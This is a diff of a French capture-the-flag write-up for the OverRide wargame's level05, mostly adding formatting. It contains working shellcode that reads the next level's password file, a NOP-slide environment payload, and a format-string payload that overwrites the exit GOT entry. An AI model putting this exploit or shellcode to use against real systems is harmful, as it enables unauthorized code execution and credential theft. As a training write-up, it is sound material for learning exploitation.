@@ -7,9 +7,9 @@ level05@OverRide:~$ gdb level05
 Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.
 (gdb) disas exit
 Dump of assembler code for function exit@plt:
-   0x08048370 <+0>:	jmp    *0x80497e0
-   0x08048376 <+6>:	push   $0x18
-   0x0804837b <+11>:	jmp    0x8048330
+   0x08048370 <+0>:     jmp    *0x80497e0
+   0x08048376 <+6>:     push   $0x18
+   0x0804837b <+11>:    jmp    0x8048330
 End of assembler dump.
 (gdb)
 ```
@@ -28,18 +28,25 @@ int main() {
 ```
 > gcc env.c -m32
 
-Notre shellcode, qui print le contenu de .pass: \x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass
+Notre shellcode, qui print le contenu de .pass: `\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass`
 
 L'adresse du shellcode est 0xffffd836, mais l'adresse peut changer lorsqu'on charge le programme. On ajoute donc une NOP slide de 128 bytes pour avoir une marge:
 
+```
 export SHELLCODE=`python -c 'print "\x90" * 128 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level06/.pass"'`
+```
 
 Voici le modele de format string que l'on va utiliser:
 `adresse_premiers_16bits|adresse_seconds_16bits|%offset1|%10$hn|%offset2|%11$hn`
 
+```
 adresse1 = 0xd836 = 55350
 adresse2 = 0xffff = 65535
 offset1 = adresse1 - 8 (bytes pour les deux adresses dans le format string) = 55342
 offset2 = adresse2 - adresse1 = 10185
+```
 
-`echo $'\xe0\x97\x04\x08\xe2\x97\x04\x08%55342d%10$hn%10185d%11$hn\n' > /tmp/level05.txt`
+```
+$> echo $'\xe0\x97\x04\x08\xe2\x97\x04\x08%55342d%10$hn%10185d%11$hn\n' > /tmp/level05.txt
+$> cat /tmp/level05.txt - | ./level05
+```
